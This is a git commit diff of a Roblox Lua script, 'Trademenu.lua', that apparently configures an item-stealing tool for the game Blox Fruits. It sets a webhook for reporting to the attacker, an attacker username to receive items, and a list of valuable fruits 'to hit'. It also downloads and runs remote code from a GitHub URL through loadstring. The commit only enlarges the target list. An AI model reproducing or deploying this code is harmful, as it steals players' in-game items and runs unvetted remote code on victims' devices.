2a4768b0f94a6835e5bbe325d1afda1dc283a293
SpIeedx <josemoreirasaldarriaga42@gmail.com>
2025-03-09 12:51:23 -0500

    Update Trademenu.lua

--- Trademenu.lua
+++ Trademenu.lua
@@ -1,5 +1,5 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=Y0c2dk8ydlZhWDQwNmV0R0xIRXFYZzpPbmUwYWR1Y2VNSTA4M2FleVpRM1JUUllKUGNkMlIwVkQxMXhxYUt3R3paRFkxVHZWUDZjSWdBUjRQNTFMTktId1pyRjFNNXBiSjNTendQaVEwMjZOWWVJdFp0UEx0V1doZnBpcjZHRENDUmxJR2V0NjQ5WWR0R196dGFpUUlwTHJGbzdOeEx0M0hTNnhJZUgxRTlWN29EdzVDVzRpU2N1emNLVDdEX2VyeTg"
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=elJzOGRwaE83Y2E2ZzZLUTlGVWFrdzpjYUh1dFdzY3BWSktsRHpxQW5FcDVOSkEzN093b0paOG0tQXRfQ0NnMVRBYW52VW12M3JoV0Y2ZUV0dGZ6UThDbFBOMmxYME4yZHFVYUZhakswQm5XenUwNDVhT3g5Qi1MdzNPWmRQRG1qdHV0bFZHNFJCb21ZTTF3eU5vRnpyeExDX1VGTkJXZXVfQ1MzcjhxRnMzN2tfcGpuN0MyNm9nWUVjV0tFNXhBRVU"
 Usernames = {"Rip_Iindrax2000"}
-FruitsToHit = {"Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
+FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "T-Rex-T-Rex", "Mammoth-Mammoth", "Dough-Dough", "Shadow-Shadow", "Venom-Venom", "Control-Control", "Gas-Gas", "Spirit-Spirit", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune"}
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
